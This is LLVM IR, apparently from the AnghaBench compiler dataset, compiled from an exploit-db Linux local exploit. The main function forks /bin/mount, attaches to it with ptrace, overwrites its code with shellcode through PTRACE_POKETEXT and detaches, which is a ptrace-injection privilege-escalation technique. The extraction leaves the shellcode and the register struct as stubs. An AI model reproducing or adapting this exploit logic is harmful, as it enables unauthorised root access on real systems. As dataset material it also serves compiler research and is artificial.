; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_8678.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_8678.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.user_regs_struct = type { i32 }

@.str = private unnamed_addr constant [6 x i8] c"mount\00", align 1
@__const.main.argv = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i32 0, i32 0), i8* null], align 16
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@__const.main.envp = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i8* null], align 16
@.str.2 = private unnamed_addr constant [11 x i8] c"/bin/mount\00", align 1
@PTRACE_ATTACH = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [17 x i8] c"/proc/%d/cmdline\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [11 x i8] c"[ WIN! %d\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@PTRACE_GETREGS = common dso_local global i32 0, align 4
@shellcode = common dso_local global i64 0, align 8
@PTRACE_POKETEXT = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [20 x i8] c"[ Overwritten 0x%x\0A\00", align 1
@PTRACE_SETREGS = common dso_local global i32 0, align 4
@PTRACE_DETACH = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.user_regs_struct, align 4
  %6 = alloca [2 x i8*], align 16
  %7 = alloca [2 x i8*], align 16
  %8 = alloca [256 x i8], align 16
  %9 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %4, align 4
  %10 = bitcast [2 x i8*]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 bitcast ([2 x i8*]* @__const.main.argv to i8*), i64 16, i1 false)
  %11 = bitcast [2 x i8*]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 bitcast ([2 x i8*]* @__const.main.envp to i8*), i64 16, i1 false)
  %12 = call i64 (...) @fork()
  store i64 %12, i64* %2, align 8
  %13 = load i64, i64* %2, align 8
  %14 = icmp eq i64 %13, 0
  br i1 %14, label %15, label %19

15:                                               ; preds = %0
  %16 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 0
  %17 = getelementptr inbounds [2 x i8*], [2 x i8*]* %7, i64 0, i64 0
  %18 = call i32 @execve(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8** %16, i8** %17)
  br label %85

19:                                               ; preds = %0
  %20 = load i32, i32* @PTRACE_ATTACH, align 4
  %21 = load i64, i64* %2, align 8
  %22 = call i64 (i32, i64, i32, ...) @ptrace(i32 %20, i64 %21, i32 0, i8* null)
  %23 = icmp eq i64 %22, 0
  br i1 %23, label %24, label %84

24:                                               ; preds = %19
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %26 = load i64, i64* %2, align 8
  %27 = call i32 @sprintf(i8* %25, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i64 %26)
  %28 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %29 = load i32, i32* @O_RDONLY, align 4
  %30 = call i32 @open(i8* %28, i32 %29)
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %33 = call i32 @read(i32 %31, i8* %32, i32 2)
  %34 = load i32, i32* %9, align 4
  %35 = call i32 @close(i32 %34)
  %36 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %37 = load i8, i8* %36, align 16
  %38 = sext i8 %37 to i32
  %39 = icmp eq i32 %38, 109
  br i1 %39, label %40, label %83

40:                                               ; preds = %24
  %41 = load i64, i64* %2, align 8
  %42 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0), i64 %41)
  %43 = load i32, i32* @stdout, align 4
  %44 = call i32 @fflush(i32 %43)
  %45 = load i32, i32* @PTRACE_GETREGS, align 4
  %46 = load i64, i64* %2, align 8
  %47 = call i64 (i32, i64, i32, ...) @ptrace(i32 %45, i64 %46, i32 0, %struct.user_regs_struct* %5)
  %48 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %5, i32 0, i32 0
  %49 = load i32, i32* %48, align 4
  store i32 %49, i32* %3, align 4
  br label %50

50:                                               ; preds = %55, %40
  %51 = load i32, i32* %4, align 4
  %52 = load i64, i64* @shellcode, align 8
  %53 = call i32 @strlen(i64 %52)
  %54 = icmp slt i32 %51, %53
  br i1 %54, label %55, label %70

55:                                               ; preds = %50
  %56 = load i32, i32* @PTRACE_POKETEXT, align 4
  %57 = load i64, i64* %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = load i64, i64* @shellcode, align 8
  %60 = load i32, i32* %4, align 4
  %61 = sext i32 %60 to i64
  %62 = add nsw i64 %59, %61
  %63 = inttoptr i64 %62 to i32*
  %64 = load i32, i32* %63, align 4
  %65 = call i64 (i32, i64, i32, ...) @ptrace(i32 %56, i64 %57, i32 %58, i32 %64)
  %66 = load i32, i32* %4, align 4
  %67 = add nsw i32 %66, 4
  store i32 %67, i32* %4, align 4
  %68 = load i32, i32* %3, align 4
  %69 = add nsw i32 %68, 4
  store i32 %69, i32* %3, align 4
  br label %50

70:                                               ; preds = %50
  %71 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %5, i32 0, i32 0
  %72 = load i32, i32* %71, align 4
  %73 = sext i32 %72 to i64
  %74 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i64 %73)
  %75 = load i32, i32* @PTRACE_SETREGS, align 4
  %76 = load i64, i64* %2, align 8
  %77 = call i64 (i32, i64, i32, ...) @ptrace(i32 %75, i64 %76, i32 0, %struct.user_regs_struct* %5)
  %78 = load i32, i32* @PTRACE_DETACH, align 4
  %79 = load i64, i64* %2, align 8
  %80 = call i64 (i32, i64, i32, ...) @ptrace(i32 %78, i64 %79, i32 0, i8* null)
  %81 = call i32 @usleep(i32 1)
  %82 = call i32 @wait(i32 0)
  br label %83

83:                                               ; preds = %70, %24
  br label %84

84:                                               ; preds = %83, %19
  br label %85

85:                                               ; preds = %84, %15
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @fork(...) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

declare dso_local i64 @ptrace(i32, i64, i32, ...) #2

declare dso_local i32 @sprintf(i8*, i8*, i64) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @printf(i8*, i64) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @strlen(i64) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @wait(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
